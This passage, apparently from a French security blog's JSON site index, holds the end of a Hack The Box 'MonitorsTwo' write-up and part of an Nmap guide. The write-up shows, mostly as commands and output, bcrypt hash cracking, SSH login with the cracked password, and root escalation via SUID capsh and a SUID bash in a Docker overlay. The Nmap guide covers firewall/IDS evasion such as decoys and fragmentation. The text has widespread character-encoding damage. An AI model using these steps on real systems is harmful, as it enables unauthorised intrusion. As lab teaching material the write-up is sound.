$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC | | guest | 43e9a4ab75570f5b | | marcus | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | +----------+--------------------------------------------------------------+ 3 rows in set (0.001 sec) Le modificateur \\G dans le client de ligne de commande MySQL.\nNous pouvons maintenant essayer de cracker ces hash sur notre machine en utilisant d\u0026rsquo;abord le mode de d√©tection automatique de hashcat pour d√©terminer le type de hachage :\n‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ cat hashes admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C # En utilisant le mode d\u0026#39;auto detection ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ hashcat hashes /usr/share/wordlists/rockyou.txt --username hashcat (v6.2.6) starting in autodetect mode \u0026lt;SNIP\u0026gt; The following 4 hash-modes match the structure of your input hash: # | Name | Category ======+============================================================+======================== 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce Please specify the hash-mode with -m [hash-mode]. Started: Fri Jan 26 06:42:36 2024 Stopped: Fri Jan 26 06:42:38 2024 Nos hash commencent par $2y$, ce qui correspond mieux au format bcrypt de la category operating system. Nous choisirons donc le mode 3200 dans hashcat.\n‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username \u0026lt;SNIP\u0026gt; $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =\u0026gt; s Session..........: hashcat Status...........: Running Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix)) Hash.Target......: hashes Time.Started.....: Fri Jan 26 06:46:23 2024 (7 mins, 57 secs) Time.Estimated...: Tue Jan 30 09:23:44 2024 (4 days, 2 hours) En moins de 10min nous obtenons un r√©sultat pour l\u0026rsquo;utilisateur marcus :\n‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ hashcat -m 3200 --username --show hashes marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey We can now use these creds, marcus:funkymonkey, for logging into SSH:\n‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ ssh marcus@10.10.11.211 marcus@10.10.11.211\u0026#39;s password: \u0026lt;SNIP\u0026gt; You have mail. Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40 ‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ √âlevation de privil√®ges #\rNous pouvons maintenant utiliser ces identifiants marcus:funkymonkey pour nous connecter via SSH :\n‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ cat user.txt \u0026lt;********************************\u0026gt; √Ä ce niveau nous retournons donc comme la premi√®re fois dans le dossier /var/mail/ o√π nous trouverons le mail de l\u0026rsquo;admin destin√© aux utilisateurs du syst√®me et faisant mention de trois CVE, dont seul le dernier concernant une version de contenant vuln√©rable sera exploitable dans notre cas:\n‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ cat /var/mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all,... La description de la vuln√©rabilit√© fait r√©f√©rence aux r√©pertoires sous /var/lib/docker/, donc nous ne sommes int√©ress√©s que par ceux-ci.\n# Listage des conteneurs Docker ‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ findmnt TARGET SOURCE FSTYPE OPTIONS \u0026lt;SNIP\u0026gt; ‚îÇ nsfs rw ‚îú‚îÄ/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged ‚îÇ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over ‚îú‚îÄ/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm ‚îÇ shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k ‚îú‚îÄ/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged ‚îÇ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over ‚îî‚îÄ/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k Nous devons d√©terminer le conteneur associ√© √† l\u0026rsquo;application Cacti, car notre session de shell conteneuris√© se trouve √† l\u0026rsquo;int√©rieur de celui-ci. Nous pouvons le faire en cr√©ant un fichier depuis notre session de shell conteneuris√© (notre point d\u0026rsquo;entr√©e initial), puis v√©rifier si ce fichier est disponible depuis l\u0026rsquo;ext√©rieur du conteneur avec marcus.\n# D√©pla√ßons nous vers le r√©pertoire /tmp et cr√©ons un fichier test www-data@50bca5e748b0:/var/www/html$ cd /tmp www-data@50bca5e748b0:/tmp$ touch test Les contenus les plus lourds sont g√©n√©ralement des images, et si le pilote de stockage par d√©faut overlay2 est utilis√©, alors ces images Docker sont stock√©es dans /var/lib/docker/overlay2 (freecodecamp). Par cons√©quent, nous devons juste v√©rifier 2 des 4 chemins de conteneurs trouv√©s ci-dessus :\nNous pouvons v√©rifier chacun de ces 2 conteneurs s√©quentiellement pour voir lequel contient le fichier test :\n‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test ls: cannot access \u0026#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test\u0026#39;: No such file or directory ‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test -rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test Le conteneur Cacti est donc: c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1. Maintenant, nous devons attribuer des permissions SUID √† /bin/bash, afin que marcus puisse l\u0026rsquo;ex√©cuter depuis l\u0026rsquo;ext√©rieur et obtenir un shell root. Pour ce faire, nous devons d\u0026rsquo;abord √©lever nos privil√®ges √† l\u0026rsquo;int√©rieur du conteneur.\nCel√† se fera comme dans la premi√®re m√©thodologie en recherchant les fichiers avec un bit SUID:\nwww-data@50bca5e748b0:/tmp$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su En suivant les instruction d\u0026rsquo;exploitation du binaire /sbin/capsh comme indiqu√© sur Gtfobins nous obtenons notre acc√®s root:\n#root www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 -- root@50bca5e748b0:/tmp# id uid=0(root) gid=0(root) groups=0(root),33(www-data) √âtant root nous pouvons donc assigner le bit SUID au binaire /bin/bash: # assignation de permission SUID root@50bca5e748b0:/tmp# chmod u+s /bin/bash # v√©rification root@50bca5e748b0:/tmp# ls -l /bin/bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash Enfin, nous pouvons retourner √† la session SSH de marcus et ex√©cuter le binaire bash en utilisant l\u0026rsquo;option -p (link)\nflag:\n‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 bash ‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin] ‚îî‚îÄ$ ./bash -p bash-5.1# id uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus) bash-5.1# cat /root/root.txt \u0026lt;********************************\u0026gt; ","date":"16 December 2023","externalUrl":null,"permalink":"/posts/htb-monitorstwo/","section":"Posts","summary":"MonitorsTwo est une machine Linux de difficult√© facile. Elle met en avant quelques vuln√©rabilit√©s et erreurs de configurations qui seront exploit√©es afin de prendre le contr√¥le du syst√®me suivant la kill-chain\u0026hellip;","title":"MonitorsTwo (HTB)","type":"posts"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/tags/post/","section":"Tags","summary":"","title":"Post","type":"tags"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/","section":"Raizen | Blog","summary":"","title":"Raizen | Blog","type":"page"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/categories/markdown/","section":"Categories","summary":"","title":"Markdown","type":"categories"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/network/","section":"Tags","summary":"","title":"Network","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/network-analysis/","section":"Tags","summary":"","title":"Network Analysis","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/nmap/","section":"Tags","summary":"","title":"Nmap","type":"tags"},{"content":"Dans le cadre des tests d\u0026rsquo;intrusion (pentesting) et des d√©fis CTF (Capture The Flag), la phase d\u0026rsquo;√©num√©ration constitue une √©tape essentielle. C\u0026rsquo;est ici que Nmap, un outil incontournable pour les professionnels de la s√©curit√© informatique, entre en sc√®ne.\nNmap, abr√©viation de Network Mapper, est un utilitaire puissant et polyvalent, utilis√© tant par les administrateurs r√©seau que par les experts en cybers√©curit√© pour analyser, explorer et s√©curiser les infrastructures r√©seau.\nQue ce soit pour auditer la s√©curit√© d\u0026rsquo;un r√©seau interne, identifier les dispositifs connect√©s ou √©valuer la surface d\u0026rsquo;attaque d\u0026rsquo;un r√©seau distant, Nmap est un outil privil√©gi√©. Ses fonctionnalit√©s avanc√©es permettent de cartographier les h√¥tes d\u0026rsquo;un r√©seau, de d√©tecter les ports ouverts, d\u0026rsquo;identifier les services actifs, et bien plus encore.\nDans ce guide, nous explorerons les diff√©rentes options d\u0026rsquo;analyse qu\u0026rsquo;offre Nmap, et nous examinerons leur pertinence dans divers contextes de s√©curit√©. I- Analyse du R√©seau #\rAvant d\u0026rsquo;explorer les techniques avanc√©es de scan de ports offertes par Nmap, il est crucial de comprendre le fonctionnement g√©n√©ral de cet outil et de se familiariser avec la syntaxe d\u0026rsquo;une commande standard ainsi que ses options par d√©faut.\nFonctionnement G√©n√©ral de Nmap L\u0026rsquo;outil Nmap fonctionne en envoyant des paquets r√©seau √† la cible et se sert de l\u0026rsquo;analyse des r√©ponses pour d√©terminer entre autres quels ports sont ouverts, quels services sont en cours d\u0026rsquo;ex√©cution sur ces ports, et quelles sont les adresses IP des h√¥tes actifs sur le r√©seau. Il utilise diff√©rentes techniques de scan (que nous verront dans la section suivante) pour accomplir ces t√¢ches. Chacune de ces techniques ayant leurs propres utilit√©s, avantages et inconv√©nients en termes de discr√©tion, vitesse et d√©tection.\nCommande Standard de Nmap La structure d\u0026rsquo;une commande Nmap est g√©n√©ralement la suivante :\nnmap [options] [cibles]\nLes options permettent de sp√©cifier les param√®tres du scan, tels que les techniques de scan √† utiliser, les types de ports √† scanner, etc. Les cibles d√©signent les adresses IP ou les plages d\u0026rsquo;adresses √† scanner.\nII- Techniques de Scans #\rScan SYN (-sS): Ce type de scan envoie un paquet SYN sans finaliser la connexion TCP, ce qui le rend discret et difficile √† d√©tecter. Il est particuli√®rement utile pour les tests d\u0026rsquo;intrusion furtifs, mais n√©cessite souvent des privil√®ges administratifs.\nScan Connect√© (-sT): Contrairement au scan SYN, ce scan √©tablit une connexion compl√®te via TCP. Bien qu\u0026rsquo;il laisse une trace, il peut √™tre ex√©cut√© sans privil√®ges √©lev√©s.\nScan UDP (-sU): Ce scan teste les ports UDP, souvent utilis√©s par des services tels que DNS (port 53), SNMP (ports 161/163) et DHCP (ports 67/68). Il est g√©n√©ralement plus lent que le scan TCP en raison de la nature non connect√©e du protocole UDP.\nScan SCTP INIT (-sY): Ce scan utilise le protocole SCTP, en envoyant un paquet INIT sans √©tablir de connexion, similaire au SYN scan pour TCP. Il est utile pour √©viter la journalisation des connexions.\nScans Null (-sN), Fin (-sF), et Xmas (-sX): Ces scans envoient des paquets avec des combinaisons sp√©cifiques de flags TCP (aucun, FIN, ou un ensemble de flags inhabituels) pour contourner certains pare-feu et extraire des informations sur les ports ouverts.\nScan Maimon (-sM): Ce scan envoie des paquets avec les flags FIN et ACK, principalement destin√© aux syst√®mes BSD. Cependant, il peut souvent rapporter tous les ports comme √©tant ferm√©s dans les syst√®mes actuels.\nScans ACK (-sA) et Window (-sW): Utilis√©s pour identifier la pr√©sence de pare-feu, ces scans se basent sur la mani√®re dont les pare-feu r√©agissent aux paquets ACK et sur l\u0026rsquo;analyse des tailles de fen√™tre TCP.\nScan Idle (-sI): Ce scan permet une reconnaissance discr√®te en utilisant un h√¥te interm√©diaire. Il est efficace lorsque certaines adresses IP ne sont pas filtr√©es par le pare-feu.\nOption \u0026ndash;badsum: Envoie des paquets avec une somme de contr√¥le incorrecte pour provoquer des r√©ponses inattendues des pare-feu, r√©v√©lant potentiellement des informations sur leur configuration.\nScan SCTP Weird (-sZ): Con√ßu pour contourner les pare-feu, ce scan est cependant limit√© par son incapacit√© √† distinguer les ports filtr√©s des ports ouverts.\nScan de Protocole IP (-sO): Ce scan envoie des en-t√™tes IP mal form√©s pour d√©tecter les protocoles IP support√©s par la cible.\nScan par FTP Bounce (-b ): Permet de scanner une cible via un serveur FTP interm√©diaire. Bien que peu utilis√© dans la pratique, il reste une technique int√©ressante pour certains environnements sp√©cifiques.\nD√©couverte d\u0026rsquo;√âquipement #\rLors de la phase de d√©couverte, Nmap utilise par d√©faut une combinaison de techniques pour identifier les √©quipements actifs sur le r√©seau. Ces techniques incluent les options suivantes : -PA80, -PS443, -PE, et -PP, qui sp√©cifient les sondes utilis√©es par Nmap pour cette √©tape.\nPA80 : Envoie des paquets TCP SYN vers le port 80 (HTTP) pour tenter d\u0026rsquo;√©tablir une connexion. Le port 80 √©tant largement utilis√© pour les serveurs web, cette option permet de v√©rifier la disponibilit√© des h√¥tes ex√©cutant des services HTTP.\nPS443 : Envoie des paquets TCP SYN vers le port 443 (HTTPS), utilis√© pour les connexions s√©curis√©es. Cela permet de tester la connectivit√© des h√¥tes via des services HTTPS.\nPE : Envoie des paquets ICMP Echo Request (requ√™te de ping) pour v√©rifier la disponibilit√© des h√¥tes de mani√®re non intrusive.\nPP : Envoie des paquets ICMP Timestamp Request pour tester la connectivit√©, offrant une autre m√©thode discr√®te pour identifier les h√¥tes actifs.\nEn combinant ces sondes, Nmap est capable d\u0026rsquo;identifier les √©quipements actifs sur le r√©seau, ce qui permet ensuite de proc√©der √† des analyses plus approfondies des ports et des services.\nAutres options de d√©couverte #\rsL : Ce scan non intrusif effectue des requ√™tes DNS pour la r√©solution des noms, ce qui permet de lister les cibles sans envoyer de paquets aux h√¥tes directement. Il s\u0026rsquo;agit d\u0026rsquo;une approche discr√®te pour recenser les √©quipements.\nPn : D√©sactive le ping, instructant Nmap de ne pas v√©rifier la disponibilit√© des h√¥tes via ICMP. Utile lorsque vous savez que les cibles sont actives mais ne r√©pondent pas aux requ√™tes de ping.\nsn : R√©alise uniquement la d√©couverte d\u0026rsquo;h√¥tes sans effectuer de scan de ports, ce qui le rend discret et efficace pour une cartographie rapide du r√©seau.\nPR : Utilise un ping ARP pour identifier les h√¥tes actifs sur un r√©seau local. Cette m√©thode est souvent utilis√©e par d√©faut sur les r√©seaux Ethernet, car elle est pr√©cise et rapide dans un environnement local.\n-PM : Effectue un ping ICMP Address Mask Request pour v√©rifier si l\u0026rsquo;h√¥te est actif.\nPS \u0026lt;ports\u0026gt; : Envoie des paquets SYN √† des ports sp√©cifiques pour tester leur connectivit√©. Les r√©ponses permettent de d√©terminer si le port est ouvert, ferm√©, ou filtr√©.\nPA \u0026lt;ports\u0026gt; : Semblable √† PS, mais en utilisant des paquets ACK pour tester les ports. Cette m√©thode peut √™tre utilis√©e en compl√©ment pour obtenir des informations suppl√©mentaires.\nPU \u0026lt;ports\u0026gt; : Envoie des sondes √† des ports suppos√©s ferm√©s pour tester la r√©action des pare-feu, une technique utile pour la d√©tection des dispositifs de filtrage.\nPY \u0026lt;ports\u0026gt; : Envoie des sondes SCTP INIT pour d√©terminer l\u0026rsquo;√©tat des ports (ouvert, ferm√© ou injoignable), g√©n√©ralement sur le port 80 par d√©faut.\nPO \u0026lt;protocols\u0026gt; : Sp√©cifie les protocoles √† inclure dans les en-t√™tes des paquets, par exemple ICMP (1), IGMP (2), ou Encap IP (4).\n-n : D√©sactive la r√©solution DNS, ce qui permet d\u0026rsquo;acc√©l√©rer le scan en √©vitant de r√©soudre les noms d\u0026rsquo;h√¥tes associ√©s aux adresses IP.\n-R : Force la r√©solution DNS pour toutes les cibles, garantissant ainsi que les noms d\u0026rsquo;h√¥tes sont inclus dans les r√©sultats du scan.\nOptions de Ports #\r-p \u0026lt;ports\u0026gt; : Permet de sp√©cifier les ports √† scanner. Cette option est suivie de la liste des ports ou des plages que vous souhaitez analyser. Par exemple, pour scanner tous les ports, utilisez -p- ou -p all.\n-F : Effectue un scan rapide en ne v√©rifiant que les 100 ports les plus couramment utilis√©s, r√©duisant ainsi le temps d\u0026rsquo;analyse.\n--top-ports \u0026lt;nombre\u0026gt; : Sp√©cifie le nombre de ports les plus courants √† analyser, de 1 √† 65 535, en fonction de leur fr√©quence d‚Äôutilisation sur les r√©seaux.\n-r : Force Nmap √† scanner les ports dans un ordre s√©quentiel (et non al√©atoire), ce qui peut √™tre utile pour des tests de performance ou pour √©viter certaines strat√©gies de d√©tection de scan.\n--port-ratio \u0026lt;ratio\u0026gt; : Permet de focaliser l\u0026rsquo;analyse sur les ports les plus commun√©ment ouverts, en sp√©cifiant un ratio entre 0 et 1. Cela peut optimiser les scans en se concentrant sur les ports les plus susceptibles d‚Äô√™tre actifs.\nScan de Version (-sV) #\r-sV : Cette option permet √† Nmap d\u0026rsquo;identifier les versions des services actifs sur les ports ouverts. Elle envoie des sondes sp√©cifiques pour obtenir des informations d√©taill√©es sur les services. Vous pouvez ajuster l\u0026rsquo;intensit√© du scan de version, sur une √©chelle de 0 √† 9, avec une valeur par d√©faut de 7.\n--version-intensity \u0026lt;nombre\u0026gt; : Permet de contr√¥ler l\u0026rsquo;intensit√© du scan de version. Une intensit√© plus faible lancera uniquement les sondes les plus probables, ce qui peut r√©duire la dur√©e du scan, notamment dans le cadre de scans UDP.\nD√©tection d\u0026rsquo;OS (-O) #\r-O : Cette option active la d√©tection du syst√®me d\u0026rsquo;exploitation (OS) en analysant les r√©ponses des paquets r√©seau. Nmap tente d\u0026rsquo;identifier l\u0026rsquo;OS en fonction des caract√©ristiques des h√¥tes.\n--osscan-limit : Limite la d√©tection d\u0026rsquo;OS si moins de deux ports (un ouvert et un ferm√©) sont d√©tect√©s. Cela permet de r√©duire le temps de scan si les conditions d\u0026rsquo;analyse ne sont pas optimales.\n--osscan-guess : Am√©liore la pr√©cision de la d√©tection en cas d\u0026rsquo;incertitude, en effectuant une analyse plus approfondie des r√©ponses r√©seau. Cette option force Nmap √† faire des pr√©dictions m√™me si les r√©sultats sont partiels.\nIII- Scripts #\rL\u0026rsquo;option --script de Nmap permet d\u0026rsquo;ex√©cuter des scripts pendant les scans, augmentant ainsi la capacit√© de collecte d\u0026rsquo;informations. Ces scripts, appel√©s Nmap Scripting Engine (NSE), peuvent √™tre sp√©cifi√©s de diff√©rentes mani√®res : par nom de fichier, cat√©gorie, r√©pertoire ou √† l\u0026rsquo;aide d\u0026rsquo;expressions r√©guli√®res. Vous pouvez aussi ex√©cuter des scripts pr√©d√©finis via les options suivantes :\n-sC ou \u0026ndash;script=default : Ex√©cute les scripts par d√©faut, √©quivalents √† --script=default, con√ßus pour fournir un bon aper√ßu des vuln√©rabilit√©s sans √™tre trop intrusifs. Cat√©gories de scripts disponibles #\rLes scripts NSE sont organis√©s en diff√©rentes cat√©gories, chacune visant √† analyser un aspect particulier de la cible :\nAuth : Scripts pour tester les m√©canismes d\u0026rsquo;authentification. Default : Ensemble de scripts par d√©faut qui fournissent un bon point de d√©part pour des analyses initiales. Discovery : Scripts de d√©couverte permettant d\u0026rsquo;obtenir des informations suppl√©mentaires sur la cible. External : Scripts s\u0026rsquo;appuyant sur des ressources externes pour analyser la cible. Intrusive : Scripts pouvant provoquer des modifications ou un comportement inattendu sur la cible. Malware : Scripts qui d√©tectent les indicateurs de compromission (IoC) associ√©s √† des logiciels malveillants. Safe : Scripts non intrusifs garantissant qu\u0026rsquo;aucune modification n\u0026rsquo;est apport√©e √† la cible. Vuln : Scripts d√©di√©s √† la d√©tection de vuln√©rabilit√©s connues. All : Ex√©cute l\u0026rsquo;ensemble des scripts NSE disponibles. Recherche et filtrage des scripts #\rPour affiner la s√©lection des scripts √† utiliser, Nmap permet de rechercher des scripts sp√©cifiques gr√¢ce √† l\u0026rsquo;option --script-help. Celle-ci permet d\u0026rsquo;afficher des informations sur des scripts en fonction de leur nom, cat√©gorie ou comportement. Exemples de recherches :\nnmap --script-help=\u0026quot;http-*\u0026quot; : Affiche tous les scripts dont le nom commence par \u0026ldquo;http-\u0026rdquo;. nmap --script-help=\u0026quot;not intrusive\u0026quot; : Exclut les scripts intrusifs et liste les autres. nmap --script-help=\u0026quot;default or safe\u0026quot; : Affiche les scripts appartenant aux cat√©gories \u0026ldquo;default\u0026rdquo; ou \u0026ldquo;safe\u0026rdquo;. nmap --script-help=\u0026quot;default and safe\u0026quot; : Affiche les scripts qui sont √† la fois dans les cat√©gories \u0026ldquo;default\u0026rdquo; et \u0026ldquo;safe\u0026rdquo;. nmap --script-help=\u0026quot;(default or safe or intrusive) and not http-*\u0026quot; : Affiche les scripts des cat√©gories \u0026ldquo;default\u0026rdquo;, \u0026ldquo;safe\u0026rdquo; ou \u0026ldquo;intrusive\u0026rdquo; mais exclut ceux li√©s au protocole HTTP. Utilisation des arguments de scripts #\rCertains scripts NSE peuvent recevoir des arguments pour personnaliser leur fonctionnement. Vous pouvez les sp√©cifier via l\u0026rsquo;option --script-args, qui permet de passer des valeurs sp√©cifiques √† des param√®tres de scripts :\nnmap --script-args ¬´n1¬ª=¬´v1¬ª,¬´n2¬ª={_¬´n3¬ª=¬´v3¬ª},¬´n4¬ª={_¬´v4¬ª_,_¬´v5¬ª} : Permet de d√©finir plusieurs ensembles d\u0026rsquo;arguments. Si vous avez une configuration plus complexe ou des ensembles d\u0026rsquo;arguments r√©currents, il est possible de les fournir √† partir d\u0026rsquo;un fichier texte en utilisant --script-args-file, ce qui est particuli√®rement pratique pour les configurations automatis√©es.\nAide, d√©bogage et mise √† jour des scripts #\r\u0026ndash;script-help ¬´nom_fichier¬ª | ¬´cat√©gorie¬ª | ¬´r√©pertoire¬ª | ¬´expression¬ª | all : Cette option affiche de l\u0026rsquo;aide sur les scripts en fonction du fichier, de la cat√©gorie, du r√©pertoire, ou d\u0026rsquo;une expression r√©guli√®re. Sp√©cifier \u0026ldquo;all\u0026rdquo; affiche l\u0026rsquo;aide pour tous les scripts disponibles. \u0026ndash;script-trace : Active le tra√ßage d√©taill√© de l\u0026rsquo;ex√©cution des scripts, fournissant des informations pr√©cieuses pour le d√©bogage ou la compr√©hension des interactions entre les scripts et la cible. \u0026ndash;script-updatedb : Met √† jour la base de donn√©es des scripts NSE install√©s, n√©cessaire lorsque vous ajoutez de nouveaux scripts ou effectuez des mises √† jour sur les scripts existants. IV- Contr√¥le du Temps et de l\u0026rsquo;Aggressivit√© des Scans #\rNmap propose plusieurs options pour ajuster le contr√¥le du temps et l\u0026rsquo;agressivit√© des scans, permettant ainsi de mieux g√©rer les ressources et d\u0026rsquo;adapter les performances en fonction des besoins sp√©cifiques.\nContr√¥le du Temps #\rNmap permet de configurer les d√©lais et les performances des scans en utilisant des unit√©s de temps vari√©es (millisecondes, secondes, minutes) :\nTemps de scan ajustable : Vous pouvez d√©finir le temps en utilisant des arguments tels que --host-timeout, qui accepte des formats vari√©s : 900000ms, 900, 900s, et 15m effectuent tous la m√™me t√¢che, soit un d√©lai de 15 minutes.\nContr√¥le des groupes d\u0026rsquo;h√¥tes :\n--min-hostgroup ¬´numhosts¬ª et --max-hostgroup ¬´numhosts¬ª permettent de d√©finir la taille des groupes d\u0026rsquo;h√¥tes analys√©s simultan√©ment. Contr√¥le du parall√©lisme :\n--min-parallelism ¬´numprobes¬ª et --max-parallelism ¬´numprobes¬ª contr√¥lent le nombre de sondes envoy√©es en parall√®le. Temps de r√©ponse RTT (Round Trip Time) :\n--min-rtt-timeout ¬´time¬ª, --max-rtt-timeout ¬´time¬ª, et --initial-rtt-timeout ¬´time¬ª permettent d\u0026rsquo;ajuster les d√©lais de r√©ponse pour les connexions. Nombre de tentatives :\n--max-retries ¬´numtries¬ª ajuste le nombre de tentatives avant d\u0026rsquo;abandonner une connexion. D√©lai entre scans :\n--scan-delay ¬´time¬ª et --max-scan-delay ¬´time¬ª modifient le d√©lai entre chaque test envoy√© √† un h√¥te. Taux d\u0026rsquo;envoi de paquets :\n--min-rate ¬´number¬ª et --max-rate ¬´number¬ª ajustent le nombre de paquets envoy√©s par seconde, ce qui peut influencer la vitesse du scan. Bypass des limites RST :\n--defeat-rst-ratelimit permet d\u0026rsquo;ignorer les limitations de r√©ponse RST (Reset) sur certains r√©seaux, acc√©l√©rant ainsi le scan. Contr√¥le de l\u0026rsquo;Aggressivit√© #\rL\u0026rsquo;option -T dans Nmap ajuste le niveau d\u0026rsquo;agressivit√© du scan en modifiant divers param√®tres comme les d√©lais, le parall√©lisme, et la gestion des ressources. Les niveaux d\u0026rsquo;agressivit√© sont d√©finis comme suit :\n-T0 (paranoid) : Effectue un test √† la fois, en introduisant un d√©lai de 5 minutes entre chaque test. Utilis√© pour des scans extr√™mement furtifs. -T1 (sneaky) : Ajoute un d√©lai de 15 secondes entre chaque test. -T2 (polite) : R√©duit le d√©lai √† 0,4 seconde, tout en restant discret. -T3 (normal) : Niveau par d√©faut, √©quilibrant vitesse et utilisation des ressources. -T4 (aggressive) : Optimise le scan pour une vitesse accrue tout en limitant l\u0026rsquo;impact r√©seau, adapt√© pour des scans relativement rapides sans trop de risques. -T5 (insane) : Utilise toutes les ressources disponibles pour un scan aussi rapide que possible. Ce niveau est le plus rapide mais aussi le plus intrusif, pr√©sentant des risques accrus de d√©tection et de perturbation. V- Firewall/IDS: Options de Masquage et de Fragmentation dans Nmap #\rNmap offre des fonctionnalit√©s avanc√©es pour contourner les syst√®mes de s√©curit√© tels que les pare-feu et les syst√®mes de d√©tection d\u0026rsquo;intrusion (IDS). Voici quelques-unes des principales options que vous pouvez utiliser pour am√©liorer la discr√©tion de vos scans.\nFragmentation des Paquets #\rOption -f : Cette option permet de fragmenter les paquets envoy√©s lors du scan. Par d√©faut, Nmap divise les paquets en morceaux de 8 octets apr√®s l\u0026rsquo;en-t√™te. Si vous souhaitez sp√©cifier une taille de fragment diff√©rente, vous pouvez utiliser l\u0026rsquo;option ..mtu, tout en veillant √† ce que le d√©calage soit un multiple de 8. Il est important de noter que la fragmentation n\u0026rsquo;est pas prise en charge par les scanners de version et les scripts Nmap. Masquage d\u0026rsquo;Adresse IP #\rMasquage d\u0026rsquo;Adresse avec -D :\nSyntaxe : -D decoy1,decoy2,ME Cette option permet √† Nmap d\u0026rsquo;envoyer des scans en utilisant d\u0026rsquo;autres adresses IP comme origine, ce qui aide √† dissimuler votre adresse IP r√©elle. En ajoutant ME √† la liste, vous indiquez √† Nmap que vous souhaitez inclure votre adresse IP. Il est recommand√© de positionner 5 √† 6 adresses IP fictives avant la v√¥tre pour obtenir un masquage optimal. Vous pouvez √©galement g√©n√©rer des adresses IP al√©atoires √† l\u0026rsquo;aide de l\u0026rsquo;option RND:¬´nombre¬ª, o√π 